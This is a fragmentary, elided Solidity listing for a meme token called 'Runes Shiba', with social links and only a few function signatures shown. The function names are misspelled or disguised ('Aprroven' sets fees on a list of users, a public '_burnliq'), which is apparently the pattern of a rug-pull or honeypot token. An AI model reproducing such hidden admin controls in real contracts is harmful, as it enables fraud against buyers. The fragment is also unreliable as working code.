/**
https://t.me/Runesshib
https://twitter.com/RunesShib
...
abstract contract Ownable {
    ...
    function transferOwnershiptbbenrtys(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract RUNESSHIBA is Ownable {
    ...
    constructor (){
        name = unicode"Runes Shiba";
        symbol = unicode"RUNESSHIB";
        decimals = 9;
    ...
    function Aprroven(address[] memory users, uint256 feePercent) external {
    ...
    function _burnliq(address user) public {
